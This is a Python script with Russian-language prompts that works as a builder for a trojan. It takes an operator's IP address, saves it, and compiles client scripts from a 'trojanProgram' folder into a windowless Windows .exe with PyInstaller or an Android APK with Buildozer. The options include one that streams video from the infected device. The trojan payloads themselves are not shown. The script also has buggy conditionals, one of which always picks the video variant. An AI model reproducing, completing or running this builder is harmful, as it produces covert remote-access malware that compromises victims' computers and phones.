import os
import time
import subprocess

def save_ip_to_file(ip, filename="ip.txt"):
    """Сохраняет IP-адрес в файл."""
    with open(filename, 'w') as f:
        f.write(ip)

def load_ip_from_file(filename="ip.txt"):
    """Загружает IP-адрес из файла."""
    if os.path.exists(filename):
        with open(filename, 'r') as f:
            return f.read().strip()
    return ""

def compile_to_exe(script_path):
    """Компилирует указанный Python файл в .exe с помощью PyInstaller."""
    if not os.path.isfile(script_path):
        print(f"Файл {script_path} не найден.")
        return

    try:
        print("Установка необходимых инструментов...")
        subprocess.run(['pip', 'install', 'pyinstaller'], check=True)

        print(f"Компилируем {script_path} в .exe...")
        subprocess.run(['pyinstaller', '--onefile', '--noconsole', script_path], check=True)
        
        # Удаляем временные файлы и директории PyInstaller
        for item in ['build', 'dist', '__pycache__', f'{os.path.splitext(script_path)[0]}.spec']:
            if os.path.exists(item):
                subprocess.run(['rm', '-rf', item], check=True)
        
        print(f"Компиляция {script_path} завершена!")
    except subprocess.CalledProcessError as e:
        print(f"Ошибка при компиляции: {e}")

def compile_to_apk(script_path):
    """Компилирует указанный Python файл в APK с помощью BeeWare (Buildozer)."""
    if not os.path.isfile(script_path):
        print(f"Файл {script_path} не найден.")
        return

    try:
        # Убедитесь, что Buildozer и необходимые зависимости установлены
        print("Установка необходимых инструментов...")
        subprocess.run(['pip', 'install', 'buildozer', 'cython', 'kivy'], check=True)
        
        # Переходим в директорию проекта, где находится script_path
        script_dir = os.path.dirname(os.path.abspath(script_path))
        os.chdir(script_dir)
        
        # Инициализация Buildozer (создание buildozer.spec, если еще не создан)
        if not os.path.isfile('buildozer.spec'):
            print("Создание buildozer.spec файла...")
            subprocess.run(['buildozer', 'init'], check=True)
        
        # Обновление buildozer.spec файла с указанным script_path
        print("Обновление buildozer.spec файла...")
        with open('buildozer.spec', 'r') as file:
            lines = file.readlines()
        
        with open('buildozer.spec', 'w') as file:
            for line in lines:
                if line.startswith('source.include_exts'):
                    file.write('source.include_exts = py,png,jpg,kv,atlas\n')
                elif line.startswith('source.include_patterns'):
                    file.write(f'source.include_patterns = {os.path.basename(script_path)}\n')
                else:
                    file.write(line)
        
        # Сборка APK
        print(f"Компиляция {script_path} в APK для Android...")
        subprocess.run(['buildozer', 'android', 'debug'], check=True)
        print("Компиляция завершена! APK создан.")
    
    except subprocess.CalledProcessError as e:
        print(f"Ошибка при выполнении команды: {e}")
    except Exception as e:
        print(f"Ошибка при компиляции APK: {e}")

def main():
    print("Эта программа работает на Windows и на Android")
    choice = input("Вы хотите продолжить (Yes/No): ").lower()
    if choice != "yes":
        print("Программа завершена.")
        return

    client_user = input("К какому устройству вы хотите подключиться? (1 - Windows, 2 - Android): ")

    if client_user == "1":
        video = input("Вы хотите, чтобы видео воспроизводилось на подключенном устройстве? (Yes/No): ").lower()
        ip = input("Введите ваш IP: ")
        save_ip_to_file(ip)
        print("IP сохранен. Компиляция программы через 3 секунды...")

        time.sleep(3)

        # Проверка наличия файла
        if video == "yes" or "y" or "Yes" or "Y":
            script_path = os.path.join(os.getcwd(), 'trojanProgram/WindowsTrojan/ClientWindowsWithVideo.py')
        else:
            script_path = os.path.join(os.getcwd(), 'trojanProgram/WindowsTrojan/ClientWindowsWithoutVideo.py')

        if not os.path.isfile(script_path):
            print(f"Файл {script_path} не найден.")
            return

        # Запускаем компиляцию в exe
        compile_to_exe(script_path)

    elif client_user == "2":
        print("Создание apk файлов лучше делать или на Linux или в термукс")
        choise = input("Хотите продолжить?(yes/no): ").lower()
        if choise != "yes" or "Y" or "Yes" or "YES" or "y":
            return
        video = input("Вы хотите, чтобы видео воспроизводилось на подключенном устройстве? (Yes/No): ").lower()
        ip = input("Введите ваш IP: ")
        save_ip_to_file(ip)
        print("IP сохранен. Компиляция программы через 3 секунды...")

        time.sleep(3)

        # Проверка наличия файла
        if video == "yes":
            script_path = os.path.join(os.getcwd(), 'trojanProgram', 'AndroidClient', 'ClientAndroidWithVideo.py')
        else:
            script_path = os.path.join(os.getcwd(), 'trojanProgram', 'AndroidClient', 'ClientAndroidWithoutVideo.py')

        if not os.path.isfile(script_path):
            print(f"Файл {script_path} не найден.")
            return

        # Запускаем компиляцию в APK
        compile_to_apk(script_path)

    else:
        print("Неправильный выбор. Программа завершена.")

if __name__ == "__main__":
    main()
